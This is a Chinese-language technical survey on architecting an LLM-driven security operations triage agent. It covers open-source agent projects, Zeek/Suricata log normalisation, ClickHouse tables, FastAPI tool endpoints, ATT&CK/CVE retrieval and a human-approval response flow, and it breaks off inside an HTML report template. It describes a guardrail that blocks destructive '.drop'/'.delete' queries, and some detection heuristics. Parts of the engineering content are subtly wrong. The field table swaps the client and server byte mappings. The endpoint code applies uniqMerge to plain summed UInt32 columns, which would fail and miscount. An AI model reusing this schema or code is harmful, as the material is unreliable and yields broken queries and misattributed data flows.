# **基于大语言模型与开源技术栈的自主安全运营研判智能体架构调研报告**

随着企业网络边界的延伸与网络攻击手法的日趋自动化，安全运营中心（SOC）普遍面临告警风暴（Alert Fatigue）、分析上下文碎片化以及响应处置窗口滞后等挑战。构建以大语言模型（LLM）为核心认知引擎，深度协同威胁情报（CTI）、网络遥测大数据分析（ClickHouse）与自动化编排（SOAR）的自主安全研判与处置智能体（Autonomous SOC Agent），已成为提升安全运营效能的关键演进方向。  
针对中小型安全团队在十周周期内的轻量化交付需求，本报告聚焦于离线流量解析、海量日志列式检索、知识库检索增强（RAG）、多源关联研判推理及闭环阻断全链路，展开深度的技术选型调研与工程架构设计。

## **开源安全运营智能体架构调研**

在开源社区与学术前沿领域，安全研判系统正经历从传统的静态规则匹配、单轮问答对话，向具备环境感知、多步工具调用、假设检验与自主处置的智能体系统演进。针对复杂威胁研判中的实体抽取、思维链（CoT）推理、证据链聚合以及分层处置机制，以下四个代表性开源项目展现了显著的工程借鉴价值。

### **核心开源项目剖析**

#### **FunnyWolf / agentic-soc-platform**

该项目定位为以智能体为核心的开源自动化安全运营平台，在 GitHub 社区已获得超过 1.2k Stars，保持着高频的提交与维护活跃度1。其后端采用 Python 构建核心业务与扩展模块，前端基于 TypeScript 开发，底层编排逻辑融合了 LangChain 与 LangGraph 的图状态流转理念，支持完全私有化本地部署1。  
在系统调用时序上，平台通过 Webhook 接收或主动拉取来自多源 SIEM（如 Splunk、Elasticsearch）的告警事件1。接入模块首先对离散告警执行原子指标（IOC）抽取，并通过时间窗口与资产拓扑算法将海量告警聚合为高内聚的安全案例（Cases）与工件（Artifacts）1。随后，系统自动触发情报富化插件，补全威胁信誉、威胁情报标签及资产 CMDB 上下文1。在研判阶段，系统启动基于 LangGraph 的 Playbook 编排流程，驱动大模型对案例内的多源证据进行关联推演，生成包含威胁判定结论（Verdict）、严重级别、置信度以及影响面的结构化调查报告1。案件归档后，智能体提取闭环研判经验回流至知识库，形成运营经验的持续沉淀1。  
该项目对研判系统的核心工程启发在于其以案例为中心（Case-Centric）的会聚模型1。安全运营智能体应当避免对离散的单条网络流告警执行频繁的单点大模型调用，而应在数据接入层将同源 IP、关联资产在特定时间窗口内的行为聚合成案例单元，再将多维上下文压缩后交由大模型研判，从而显著降低输入 Token 消耗并遏制模型推理幻觉1。

#### **M507 / AI-SOC-Agent (SamiGPT)**

该项目基于 Black Hat 2025 的前沿研究成果开源，专注于构建面向企业级 SOC 场景的自动化告警分流与事件响应智能体，目前处于高度活跃的迭代周期2。系统采用 Python 构建，核心机制是基于模型上下文协议（Model Context Protocol, MCP）构建解耦的工具调用网关，无缝集成了 Elasticsearch、TheHive、IRIS、OpenCTI 以及 NetBox 等经典开源安全基础设施2。  
系统架构在认知逻辑上设计了严密的分层路由机制，清晰划分为一级分流智能体（SOC1 Agent）与二级深度调查智能体（SOC2 Agent）2。当新告警涌入时，SOC1 智能体依照预置的分流运行手册（Runbook）调用基础情报工具执行实体属性查询，快速剔除已知良性模式与典型误报2。若告警被判定为可疑，则将实体上下文升级移交至 SOC2 智能体2。SOC2 智能体通过 MCP 协议调用统一的抽象 API（如 SIEMClient、EDRClient），在数据湖中检索横向移动痕迹与异常进程链，构建端到端的攻击时间线，并将高危遏制建议下发至人工审批队列（Human-in-the-Loop Approval Queue）等待终审2。  
SamiGPT 提供了标准的工具抽象总线实现范式2。智能体业务逻辑与底层安全组件之间不应存在直接的专有驱动依赖，而应通过统一的协议契约暴露查询与操作工具，使智能体能够在稳定的认知层进行意图推演，极大地增强了系统的模块化拓展能力2。

#### **Aaniket09 / AI-SOC-Agent**

该项目是一个模块化的命令行威胁猎捕与自动化响应智能体，采用 Python 3.10+ 开发，深度对接了 Microsoft Sentinel（Log Analytics API）与 Defender for Endpoint（MDE API）3。该项目的核心关注点在于如何将大语言模型嵌入实际的威胁运营闭环中，同时引入高可靠的工程护栏3。  
系统的执行链路严格遵循观察（Observe）、调整（Orient）、决策（Decide）、行动（Act）的 OODA 循环3。在观察与调整阶段，智能体将分析师的自然语言查询转换为附带时间范围限定的针对性检索语法（KQL）3。在语句下发底层数据分析引擎之前，系统内置的防御性安全护栏（Guardrails）对语法进行正则与语义解析，严格剔除破坏性指令（如 .drop 或 .delete），并执行前置 Token 与查询成本预估3。数据返回后，决策模块利用大模型对遥测日志进行分类并对齐 MITRE ATT\&CK 框架，最终在行动阶段向防护端下发隔离指令，并自动生成防御检测规则反哺规则库3。  
该项目证明了在安全分析自动化中引入前置语法安全校验与查询边界隔离的必要性3。在连接底层日志数据库（如 ClickHouse）时，智能体严禁拥有全量任意 SQL 执行权限，必须由中间层建立严格的白名单校验与查询成本控制机制，保障生产环境的数据资产安全3。

#### **mrwadams / attackgen**

该项目由资深网络安全架构师设计，专注于利用大语言模型与 MITRE ATT\&CK / ATLAS 框架进行网络攻击场景生成、推演及应急响应测试，其代码基于 LangChain-Core 与 LiteLLM 构建，保持着对最新推理模型接口的良好适配5。  
AttackGen 的核心逻辑是将 MITRE 框架的 STIX 结构化数据进行逻辑解析，提取攻击组织、技术手法（Techniques）以及防御缓解方案之间的有向无环图（DAG）关系5。智能体利用大模型强大的逻辑归纳能力，结合被保护企业的资产特征，推演攻击者在获取初始访问权限后可能采取的横向移动、凭据转储与数据渗漏路径，生成多阶段的攻击链假说5。  
该项目为研判智能体提供了标准化的攻击意图推演方法论5。当研判智能体捕获到初步的漏洞利用告警时，可借助 ATT\&CK 技战术映射推导出攻击者在战术层面的后续动向，使研判结论从单纯的“已知攻击告警确认”跃升至“攻击演进态势预测”5。

### **开源安全 Agent 架构对比**

| 对比维度 | FunnyWolf / agentic-soc-platform | M507 / AI-SOC-Agent (SamiGPT) | Aaniket09 / AI-SOC-Agent | mrwadams / attackgen |
| :---- | :---- | :---- | :---- | :---- |
| **架构定位** | 全功能 Agentic SOC 协同处置中台 | 基于 MCP 协议的企业级分级研判平台 | 极简 OODA 威胁猎捕与响应引擎 | ATT\&CK 战术链推演与攻防验证引擎 |
| **核心技术底座** | LangGraph \+ Vue \+ Webhook1 | FastAPI / MCP \+ TheHive / Elastic2 | Python 原生架构 \+ Sentinel/MDE3 | LangChain-Core \+ LiteLLM5 |
| **决策推演模式** | 规则 Playbook 与图状态智能体混合驱动1 | SOC1 分流过滤与 SOC2 深度挖掘两级协作2 | 单 Agent 状态机循环推进3 | 基于 ATT\&CK DAG 拓扑的链式推理5 |
| **工具抽象标准** | 自研 Python 模块化扩展插件1 | 标准化 Model Context Protocol2 | 针对目标 SIEM/EDR 的专用 API 封装3 | 统一 LiteLLM 接口与结构化 Prompt 注入5 |
| **人机协同机制** | 平台 Web UI 案例认领与流程协同1 | 针对高危指令的显式审批队列（HITL）2 | 命令行交互式人工确认阻断3 | 专注于战术生成，无生产拦截闭环5 |
| **工程复用启发** | 告警聚类汇聚模型、调查报告字段标准1 | 工具网关解耦架构、L1/L2 职责解耦切分2 | 查询护栏防御机制、前置成本预估方案3 | 攻击意图与后续技战术推演思维链5 |

## **离线流量解析与安全日志仿真数据集构建**

在资源有限的轻量化工程实施中，构建实时的分布式网络流量采集处理通道投入产出比较低。利用经过工业验证的离线 PCAP 解析工具提取结构化事件，或基于国际公认的基准安全数据集快速生成仿真日志，是确保智能体研发聚焦于研判决策核心的有效路径。

### **PCAP 快速批处理解析工具方案**

通过离线方式对流量捕获文件进行批处理时，底层应尽量复用经过高度优化的 C/Go 引擎，上层由 Python 进行多任务调度与格式归一化：  
Brimdata 开发的 Brimcap 命令行套件（https\://github.com/brimdata/brimcap）是一个高度成熟的解决方案6。该工具用 Go 语言将 Zeek 与 Suricata 的执行体进行了静态打包，能够在单个处理进程中同时运行流量深度协议分析与特征签名匹配，直接将 .pcap 流量转化为 ZNG 或流式 NDJSON 格式，有效规避了在本地单独编译部署复杂的网络入侵检测系统环境的工程开销6。  
针对自定义脚本开发场景，可编写轻量级 Python 批处理调度器，借助标准库 concurrent.futures.ProcessPoolExecutor 并行调用 Zeek 与 Suricata 命令行二进制文件7。针对 Zeek，通过附加 LogAscii::use\_json=T 脚本参数驱动其直接输出 JSON 格式的 conn.log、http.log、dns.log 等协议日志；针对 Suricata，通过 \-r 参数指定离线 PCAP 文件，配合开启 EVE JSON 输出选项，可直接获取标准化包含协议层及告警层的 eve.json 文件7。

### **CIC-IDS2017/2018 仿真数据集转换与重放**

加拿大网络安全研究所发布的 CIC-IDS2017 与 CIC-IDS2018 数据集包含了广泛的真实网络攻击场景（涵盖 DoS、PortScan、Web Attack、Infiltration、Heartbleed 等常见威胁类别），是学术与工程界用于评估入侵检测系统效能的权威数据集8。在智能体开发测试过程中，该数据集可以通过两种方式实现工程复用：  
其一是网络层重放方案，利用开源网络测试工具 tcpreplay（https\://github.com/appneta/tcpreplay）将 CIC-IDS2017 官方提供的原始 .pcap 流量文件以恒定速率灌入 Linux 虚拟回环网卡接口（例如 veth 对）11。在接口后端挂载标准 Suricata 进程进行监听，能够直接产出带有精确时序标记的真实 eve.json 告警流11。  
其二是特征日志转换方案。鉴于 CIC-IDS2017 官方同时发布了由 CICFlowMeter 提取的包含 80 余项流统计特征的 CSV 文件，安全开发人员可编写数据映射脚本，将流持续时间、源目的 IP、源目的端口、双向包数以及协议类型等字段，批量转换为符合 Zeek conn.log 规范的 JSON 数据包，直接导入下游数据存储系统，从而规避重复的原始报文逐包解析计算8。

### **推荐日志字段规范契约**

为了屏蔽 Zeek 与 Suricata 输出字段命名的细微差异，为智能体研判层提供统一的数据视图，建议在写入数据湖前将日志清洗归一化为如下标准字段契约14：

| 归一化字段名 | 数据类型 | Zeek conn.log 映射 | Suricata eve.json 映射 | 智能体研判与意图推演中的业务含义 |
| :---- | :---- | :---- | :---- | :---- |
| timestamp | DateTime64(3) | ts | timestamp | 证据链时间轴对齐、攻击持续时长测算与事件频次统计 |
| event\_type | LowCardinality(String) | 缺失（置为 flow） | event\_type (alert/flow) | 区分基础网络流通信日志与特征告警命中记录 |
| src\_ip | IPv4 | id.orig\_h | src\_ip | 攻击源实体、内网失陷资产定位、情报信誉反查主键 |
| src\_port | UInt16 | id.orig\_p | src\_port | 攻击源连接端口，用于辅助判断自动化扫描器特征 |
| dest\_ip | IPv4 | id.resp\_h | dest\_ip | 受害目标实体、资产重要度评估、横向移动受害点分析 |
| dest\_port | UInt16 | id.resp\_p | dest\_port | 目标业务开放端口（识别 Web、SSH、SMB、RDP 等暴露面） |
| proto | LowCardinality(String) | proto | proto | 传输层网络协议（TCP、UDP、ICMP）过滤 |
| app\_proto | LowCardinality(String) | service | app\_proto | 应用层协议指纹（HTTP、DNS、TLS、SSH 等识别结果） |
| duration | Float32 | duration | flow.age | 会话持续周期，辅助研判短时扫描或长连接 C2 心跳通信 |
| orig\_bytes | UInt64 | orig\_bytes | flow.bytes\_toclient | 客户端发往服务端的数据量，辅助识别注入载荷大小 |
| resp\_bytes | UInt64 | resp\_bytes | flow.bytes\_toserver | 服务端回包数据量，用于研判是否存在大容量数据外发渗漏 |
| alert\_signature | String | 缺失 | alert.signature | 告警特征签名，提供攻击类型分类的第一手线索 |
| alert\_category | LowCardinality(String) | 缺失 | alert.category | 威胁宏观类别（如 Web Attack、Malware Command and Control） |
| alert\_severity | UInt8 | 缺失 | alert.severity | 告警置信度与危险级别（1 代表最高级别威胁） |
| http\_uri | String | http.log \-\> uri | http.url | Web 攻击研判关键载荷上下文（识别 SQL 注入、路径遍历） |
| http\_user\_agent | String | http.log \-\> user\_agent | http.http\_user\_agent | 自动化渗透扫描器特征识别指纹（如 Sqlmap、Nmap 等） |

## **ClickHouse 安全日志存储与 FastAPI 工具适配层设计**

针对网络遥测日志写入量大、检索维度偏向时间区间聚合等特征，ClickHouse 的列式存储结构与向量化执行机制能够提供高效的分析吞吐能力16。通过 FastAPI 对底层 ClickHouse 查询进行强类型接口封装，可为智能体提供安全可靠的工具调用支持3。

### **ClickHouse 表结构与物化视图工程实践**

在生产级建表设计中，利用列式数据编码（DoubleDelta、Gorilla、T64、ZSTD）能够大幅降低海量日志对存储空间的占用，同时低基数类型（LowCardinality）对协议与告警分类字段能显著提升过滤查询效率16。通过构建以源 IP 为主键的物化视图，可将频繁的时间窗口统计操作下沉至存储引擎内部预聚合，避免智能体研判时对全表进行全量扫描16。

SQL  
\-- 创建安全遥测与告警统一存储明细表  
CREATE TABLE IF NOT EXISTS sec\_ops.network\_events  
(  
    timestamp DateTime64(3, 'UTC') CODEC(DoubleDelta, LZ4),  
    event\_type LowCardinality(String) CODEC(ZSTD(1)),  
    src\_ip IPv4 CODEC(ZSTD(1)),  
    src\_port UInt16 CODEC(T64, ZSTD(1)),  
    dest\_ip IPv4 CODEC(ZSTD(1)),  
    dest\_port UInt16 CODEC(T64, ZSTD(1)),  
    proto LowCardinality(String) CODEC(ZSTD(1)),  
    app\_proto LowCardinality(String) CODEC(ZSTD(1)),  
    duration Float32 CODEC(Gorilla, ZSTD(1)),  
    orig\_bytes UInt64 CODEC(T64, ZSTD(1)),  
    resp\_bytes UInt64 CODEC(T64, ZSTD(1)),  
    alert\_signature String CODEC(ZSTD(3)),  
    alert\_category LowCardinality(String) CODEC(ZSTD(1)),  
    alert\_severity UInt8 CODEC(T64, ZSTD(1)),  
    http\_method LowCardinality(String) CODEC(ZSTD(1)),  
    http\_uri String CODEC(ZSTD(3)),  
    http\_user\_agent String CODEC(ZSTD(3)),  
    raw\_payload String CODEC(ZSTD(6))  
)  
ENGINE \= MergeTree()  
PARTITION BY toYYYYMMDD(timestamp)  
ORDER BY (dest\_port, src\_ip, dest\_ip, timestamp)  
SETTINGS index\_granularity \= 8192, ttl\_only\_drop\_parts \= 1;

\-- 创建基于源 IP 的 1 小时窗口预聚合物化视图存储表  
CREATE TABLE IF NOT EXISTS sec\_ops.mv\_src\_ip\_hourly\_stats  
(  
    window\_start DateTime,  
    src\_ip IPv4,  
    total\_events UInt64,  
    distinct\_dest\_ips UInt32,  
    distinct\_dest\_ports UInt32,  
    high\_severity\_alerts UInt32,  
    total\_egress\_bytes UInt64  
)  
ENGINE \= SummingMergeTree()  
PARTITION BY toYYYYMM(window\_start)  
ORDER BY (src\_ip, window\_start);

\-- 创建触发式物化视图，将实时写入 network\_events 的数据自动预计算  
CREATE MATERIALIZED VIEW IF NOT EXISTS sec\_ops.mv\_src\_ip\_hourly\_stats\_trigger  
TO sec\_ops.mv\_src\_ip\_hourly\_stats AS  
SELECT  
    toStartOfHour(timestamp) AS window\_start,  
    src\_ip,  
    count() AS total\_events,  
    uniqExact(dest\_ip) AS distinct\_dest\_ips,  
    uniqExact(dest\_port) AS distinct\_dest\_ports,  
    countIf(alert\_severity \= 1) AS high\_severity\_alerts,  
    sum(orig\_bytes) AS total\_egress\_bytes  
FROM sec\_ops.network\_events  
GROUP BY window\_start, src\_ip;

### **FastAPI 智能体工具适配层实现**

为了使大语言模型能够自主理解并调用安全日志检索能力，工具层应利用 FastAPI 结合 Pydantic 严格限定请求入参与响应模型3。这不仅生成了符合 OpenAPI 规范的元数据以供智能体无歧义解析，还在数据库与模型之间构建了一道确定性的安全防线18。

Python  
from fastapi import FastAPI, Query, HTTPException  
from pydantic import BaseModel, Field  
from datetime import datetime, timedelta  
import clickhouse\_connect  
from typing import List, Optional

app \= FastAPI(  
    title="SOC Security Analytics Tool Gateway",  
    description="Dedicated OpenAPI tool endpoints for LLM Security Agents to query ClickHouse telemetry baselines.",  
    version="1.0.0"  
)

\# 初始化 ClickHouse 连接池客户端  
ch\_client \= clickhouse\_connect.get\_client(  
    host="127.0.0.1", port=8123, username="default", password="", database="sec\_ops"  
)

class IPSummaryResponse(BaseModel):  
    src\_ip: str \= Field(description="The examined source IPv4 address.")  
    window\_hours: int \= Field(description="Telemetry lookback window in hours.")  
    total\_events: int \= Field(description="Total connection and alert events observed.")  
    targeted\_assets\_count: int \= Field(description="Count of distinct destination IPs targeted.")  
    scanned\_ports\_count: int \= Field(description="Count of distinct destination ports targeted.")  
    critical\_alerts\_count: int \= Field(description="Number of severity-1 threat detections triggered.")  
    total\_bytes\_sent: int \= Field(description="Total outbound payload bytes sent by the source.")  
    is\_scanning\_suspect: bool \= Field(description="Heuristic baseline: indicates if sweeping behaviour was detected.")

class RawAlertDetail(BaseModel):  
    timestamp: str \= Field(description="Timestamp of alert generation.")  
    dest\_ip: str \= Field(description="Victim destination IP.")  
    dest\_port: int \= Field(description="Target destination service port.")  
    alert\_signature: str \= Field(description="Signature rule triggered.")  
    alert\_category: str \= Field(description="Classification of the alert.")  
    http\_uri: Optional\[str\] \= Field(default=None, description="HTTP URI requested if applicable.")

@app.get(  
    "/api/tools/ip\_summary",  
    response\_model=IPSummaryResponse,  
    summary="Query Source IP Historical Behavioral Profile",  
    description="Agent Tool: Inquire aggregated behavioral telemetry for a source IP within a sliding hourly window."  
)  
async def get\_ip\_summary(  
    src\_ip: str \= Query(..., description="Target source IPv4 address to investigate."),  
    lookback\_hours: int \= Query(default=1, ge=1, le=72, description="Analysis sliding window size in hours.")  
):  
    start\_time \= datetime.utcnow() \- timedelta(hours=lookback\_hours)  
    query \= """  
    SELECT  
        sum(total\_events) AS total\_events,  
        uniqMerge(distinct\_dest\_ips) AS target\_ips,  
        uniqMerge(distinct\_dest\_ports) AS target\_ports,  
        sum(high\_severity\_alerts) AS critical\_alerts,  
        sum(total\_egress\_bytes) AS egress\_bytes  
    FROM sec\_ops.mv\_src\_ip\_hourly\_stats  
    WHERE src\_ip \= toIPv4(%(src\_ip)s) AND window\_start \>= %(start\_time)s  
    """  
    try:  
        result \= ch\_client.query(query, parameters={"src\_ip": src\_ip, "start\_time": start\_time})  
        row \= result.first\_row  
        total\_ev \= row\[0\] or 0  
        tgt\_ips \= row\[1\] or 0  
        tgt\_ports \= row\[2\] or 0  
        crit\_alerts \= row\[3\] or 0  
        egress \= row\[4\] or 0  
          
        is\_scanner \= tgt\_ports \> 20 or tgt\_ips \> 10

        return IPSummaryResponse(  
            src\_ip=src\_ip,  
            window\_hours=lookback\_hours,  
            total\_events=total\_ev,  
            targeted\_assets\_count=tgt\_ips,  
            scanned\_ports\_count=tgt\_ports,  
            critical\_alerts\_count=crit\_alerts,  
            total\_bytes\_sent=egress,  
            is\_scanning\_suspect=is\_scanner  
        )  
    except Exception as e:  
        raise HTTPException(status\_code=500, detail=f"Database query failure: {str(e)}")

@app.get(  
    "/api/tools/ip\_recent\_alerts",  
    response\_model=List\[RawAlertDetail\],  
    summary="Fetch Recent Raw Signature Alerts by IP",  
    description="Agent Tool: Retrieve technical payloads and alert records to substantiate the evidence chain."  
)  
async def get\_recent\_alerts(  
    src\_ip: str \= Query(..., description="Source IPv4 address under investigation."),  
    limit: int \= Query(default=10, le=50, description="Maximum evidence logs returned.")  
):  
    query \= """  
    SELECT  
        toString(timestamp) AS ts,  
        toString(dest\_ip) AS dip,  
        dest\_port,  
        alert\_signature,  
        alert\_category,  
        http\_uri  
    FROM sec\_ops.network\_events  
    WHERE src\_ip \= toIPv4(%(src\_ip)s) AND event\_type \= 'alert'  
    ORDER BY timestamp DESC  
    LIMIT %(limit)s  
    """  
    try:  
        result \= ch\_client.query(query, parameters={"src\_ip": src\_ip, "limit": limit})  
        alerts \= \[\]  
        for row in result.result\_rows:  
            alerts.append(RawAlertDetail(  
                timestamp=row\[0\],  
                dest\_ip=row\[1\],  
                dest\_port=row\[2\],  
                alert\_signature=row\[3\],  
                alert\_category=row\[4\],  
                http\_uri=row\[5\] if row\[5\] else None  
            ))  
        return alerts  
    except Exception as e:  
        raise HTTPException(status\_code=500, detail=f"Failed to fetch raw alerts: {str(e)}")

### **数据库交互模式选型评估**

在面向大模型构建数据反查能力时，技术路线上往往存在“Text-to-SQL 动态生成”与“强类型参数化工具 API”的路线分歧：  
采用 Text-to-SQL 让智能体动态生成针对 ClickHouse 的查询语句，理论上能够满足多变的探索性查询诉求。但在实战安全运营中，该方案存在严重工程缺陷3。大语言模型极易混淆 ClickHouse 特有的 SQL 方言语法（例如数组高阶处理函数、uniqMerge 状态合并函数以及 IPv4 转换函数），高频引发语法解析异常；更严重的是，模型生成的未优化 SQL 极易引发全表非索引扫描，可能在数秒内耗尽 ClickHouse 内存并导致数据库崩溃，同时还伴随潜在的越权与注入攻击风险3。  
相比之下，强类型参数化 API 展现出了更优的工程稳定性与安全保障3。通过将安全运营中最核心的研判反查需求（如特定 IP 画像查询、特定子网扫描统计、指定攻击载荷详情检索）预先沉淀为经过性能调优的参数化 SQL，并通过 FastAPI 暴露为具备严格模式校验的端点，智能体仅需充当调度器负责提取参数并调用工具，从而消除了 SQL 语义错误与数据库性能崩溃的隐患2。

## **MITRE ATT\&CK 与 CVE 知识库的 RAG 落地工程实践**

通用文本场景下的检索增强生成（RAG）方案多采用固定长度（如 512 Token）滑动窗口分块，这种切分策略在网络安全领域极易割裂攻击实体、技战术编号以及缓解措施之间的关联拓扑20。构建高质量的安全知识库，必须采用对象感知的结构化切分，并结合稀疏与稠密混合检索机制20。

### **领域知识库与开源技术参考**

开源社区为网络安全领域知识库的结构化构建提供了坚实的数据与工程基础：  
官方的 MITRE ATT\&CK STIX 存储库（https\://github.com/mitre-attack/attack-stix-data）集中维护了覆盖 Enterprise、Mobile 及 ICS 领域的 STIX 2.1 规范数据集，明确定义了攻击行为、威胁主体、利用工具与防护缓解方案之间的实体关系图谱20。  
在漏洞关联方面，开源项目 CVE\_Threat\_Intelligence\_Toolkit（https\://github.com/Wong-Kai-Xian/CVE\_Threat\_Intelligence\_Toolkit）演示了利用 FAISS 向量库与大语言模型，将离散的 CVE 漏洞描述和受影响产品指纹自动映射至 MITRE ATT\&CK 战术与技术层级的工程链路23。  
同时，以 Buldrr 工作流及相关安全 AI 探索项目为代表的实现，验证了通过 Qdrant/ChromaDB 等向量引擎存储 ATT\&CK 与 CVE 知识块，并在告警分流流水线中执行动态上下文召回的可靠性21。

### **安全领域文档切分策略（Chunking）最佳实践**

针对网络安全知识的特殊性，应当摒弃基于字符长度的机械切片，全面转向**基于 STIX 对象维度的语义原子切分（Object-Centric Chunking）**20：  
在处理 MITRE ATT\&CK 数据时，通过 Python stix2 库解析 STIX 2.1 实体，严格以单个战术（Tactic）、技术（Attack Pattern）、缓解措施（Course of Action）或恶意软件（Malware）为一个独立的文档切片20。每一个切片在入库前被重构为具备强语义结构的紧凑 Markdown 格式，以确保上下文完整：

# **Technique: T1190 \- Exploit Public-Facing Application**

* Tactic: TA0001 \- Initial Access  
* Affected Platforms: Linux, Windows, macOS, Network Devices  
* Data Sources: Application Log (DS0015), Network Traffic (DS0029)  
* Description: Adversaries may attempt to exploit vulnerabilities in Internet-facing software (such as web servers, message brokers, VPNs) to execute arbitrary code or gain initial unauthorized system access.  
* Detection Heuristics: Monitor for anomalous child process execution under web daemon accounts (e.g., cmd.exe spawned by w3wp.exe, or sh spawned by httpd), unexpected inbound traffic spikes with known exploit signatures, and abnormal file creations in web-accessible directories.  
* Mitigations: M1051 \- Update Software; M1048 \- Application Isolation; M1035 \- Network Segmentation.

对于 CVE 漏洞库，切分粒度应严格锁定在单个 CVE 实体23。切片应整合 NVD 官方技术描述、CWE 缺陷分类、受影响的 CPE 软件版本列表，以及 CVSS 评分与 EPSS 漏洞被利用概率，确保单条切片包含该漏洞在研判决策时所需的完整上下文23。

### **稠密语义与关键词混合检索（Hybrid Search）**

网络安全告警与研判分析中包含密集的专有名词、技术代码、漏洞编号及网络端口特征（例如 CVE-2021-44228、T1059.001、Mimikatz、Log4j、TCP/445）。纯粹依赖稠密向量检索（Dense Vector Search，如基于 OpenAI text-embedding-3 或 BGE 模型）在此类精确符号匹配上经常发生语义漂移或漏检。  
因此，安全领域的公认最佳实践是构建**稠密语义向量与 BM25 稀疏关键词的双路混合检索系统**20。在该架构下，输入的告警或分析线索将并行经过两个独立的检索通道：  
第一个通道是 BM25 稀疏检索通道，建立在 Elasticsearch、Qdrant 或 SQLite-FTS 之上，专门针对技术 ID、漏洞编号、二进制文件名及端口等精确关键词建立倒排索引，保证专有名词的零漏检率2。  
第二个通道是 Dense 向量检索通道，使用针对安全领域微调的模型（如 bge-base-en-v1.5）生成文本向量，用于对非标准化的攻击行为描述、攻击意图表述进行模糊语义挖掘20。  
双路检索各自召回候选文档集（通常各取 Top-20）后，系统采用互惠排序融合（Reciprocal Rank Fusion, RRF）算法计算综合得分并进行候选归并。随后，候选集被输入轻量级交叉编码重排模型（Cross-Encoder Reranker，如 bge-reranker-base）中，根据与告警上下文的相关性进行精细化打分，最终截取置信度最高的 Top-3 知识切片注入智能体上下文，实现高召回与高精度的平衡。

## **响应处置编排：开源 SOAR 联动、邮件报告模板与安全门禁**

在智能体完成了态势定性与处置建议推导后，研判链路需要进入闭环响应阶段2。为了兼顾处置效率与业务可用性，自动化阻断机制必须通过结构化报告完成通知，并在包含严格安全门禁的人机协同（Human-in-the-Loop, HITL）流程核准后执行2。

### **开源轻量 SOAR 联动范式**

Shuffle（https\://github.com/Shuffle/Shuffle）作为一款现代化的开源安全编排自动化平台，在社区中被广泛应用于衔接 SIEM 告警、威胁调查与防御联动19。Shuffle 提供了基于 OpenAPI 标准导入自定义 API 应用的机制，并原生集成了分支控制与通知能力19。  
在典型联动工作流设计中，FastAPI 智能体在研判出高危攻击事件后，通过 Webhook 向 Shuffle 发送包含案卷详情的结构化报文24。Shuffle 工作流根据风险严重度判定流转路径：对于中低风险事件，直接记录日志并关联工单；对于高危或致命风险，工作流进入“挂起等待”状态，并触发用户交互节点，向值班运维人员发送携带一次性鉴权参数的确认请求，直到收到有效回执或超时放弃，从而避免了全自动化黑盒处置带来的业务中断隐患2。

### **Jinja2 / HTML 研判邮件报告模板**

针对告警通知与人工核准场景，系统使用 Jinja2 模板引擎将智能体输出的研判结果渲染为高可读性、带有防护门禁链接的交互式 HTML 邮件报告：

HTML  
\<\!DOCTYPE **html**\>  
\<html\>  
\<head\>  
    \<meta charset\="utf-8"\>  
    \<style\>  
        body { font-family: \-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: \#f8fafc; margin: 0; padding: 24px; color: \#1e293b; }  
        .card { max-width: 680px; margin: 0 auto; background: \#ffffff; border-radius: 8px; border: 1px solid \#e2e8f0; box-shadow: 0 4px 6px \-1px rgba(0, 0, 0, 0.05); overflow: hidden; }  
        .card-header { background: \#0f172a; color: \#f8fafc; padding: 20px 24px; }  
        .card-header h2 { margin: 0; font-size: 18px; font-weight: 600; }  
        .badge { display: inline-block; padding: 4px 10px; border-radius: 9999px; font-size: 11px; font-weight: 700; margin-top: 10px; }  
        .badge-critical { background: \#ef4444; color: \#ffffff; }  
        .badge-high { background: \#f97316; color: \#ffffff; }  
        .card-body { padding: 24px; }  
        .section-header { font-size: 12px; font-weight: 700; text-transform: uppercase; color: \#64748b; letter-spacing: 0.05em; margin-bottom: 8px; border-bottom: 1px solid \#f1f5f9; padding-bottom: 4px; }  
        .entity-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; background: \#f8fafc; padding: 12px; border-radius: 6px; border: 1px solid \#e2e8f0; margin-bottom: 20px; }  
        .entity-col strong { display: block; font-size: 11px; color: \#64748b; margin-bottom: 2px; }  
        .entity-col span { font-size: 13px; font-family: monospace; color: \#0f172a; word-break: break-all; }  
        .reasoning-text { font-size: 13px; line-height: 1.6; color: \#334155; margin-bottom: 20px; }  
        .evidence-table { width: 100%; border-collapse: collapse; margin-bottom: 24px; font-size: 12px; }  
        .evidence-table th, .evidence-table td { border: 1px solid \#e2e8f0; padding: 8px 12px; text-align: left; }  
        .evidence-table th { background: \#f1f5f9; color: \#475569; }  
        .card-footer { background: \#f8fafc; border-top: 1px solid \#e2e8f0; padding: 20px; text-align: center; }  
        .btn { display: inline-block; padding: 10px 20px; font-size: 13px; font-weight: 600; border-radius: 6px; text-decoration: none; margin: 0 6px; cursor: pointer; }  
        .btn-danger { background: \#ef4444; color: \#ffffff; }  
        .btn-secondary { background: \#e2e8f0; color: \#334155; }  
    \</style\>  
\</head\>  
\<body\>  
    \<div class\="card"\>  
        \<div class\="card-header"\>  
            \<h2\>🚨 AI 研判警报: {{ alert\_title }}\</h2\>  
            \<span class\="badge {% if severity in \['CRITICAL', 'HIGH'\] %}badge-critical{% else %}badge-high{% endif %}"\>  
                研判威胁等级: {{ severity }} | 置信度: {{ confidence\_score }}%  
            \</span\>  
        \</div\>  
        \<div class\="card-body"\>  
            \<div class\="section-header"\>攻击核心要素\</div\>  
            \<div class\="entity-grid"\>  
                \<div class\="entity-col"\>\<strong\>攻击来源 (Attacker)\</strong\>\<span\>{{ attacker\_ip }}\</span\>\</div\>  
                \<div class\="entity-col"\>\<strong\>受害实体 (Victim)\</strong\>\<span\>{{ victim\_ip }}:{{ victim\_port }}\</span\>\</div\>  
                \<div class\="entity-col"\>\<strong\>ATT\&CK 技战术\</strong\>\<span\>{{ attack\_technique }}\</span\>\</div\>  
            \</div\>

            \<div class\="section-header"\>智能体多源推演与意图分析\</div\>  
            \<div class\="reasoning-text"\>{{ reasoning\_summary }}\</div\>

            \<div class\="section-header"\>关联事实证据链\</div\>  
            \<table class\="evidence-table"\>  
                \<thead\>  
                    \<tr\>\<th\>时间 (UTC)\</th\>\<th\>事件类型\</th\>\<th\>技术特征与观察记录\</th\>\</tr\>  
                \</thead\>  
                \<tbody\>  
                    {% for item in evidence\_trail %}  
                    \<tr\>  
                        \<td style\="font-family: monospace;"\>{{ item.timestamp }}\</td\>  
                        \<td\>{{ item.event\_type }}\</td\>  
                        \<td style\="font-family: monospace;"\>{{ item.details }}\</td\>  
                    \</tr\>  
                    {% endfor %}  
                \</tbody\>  
            \</table\>  
        \</div\>  
        \<div class\="card-footer"\>  
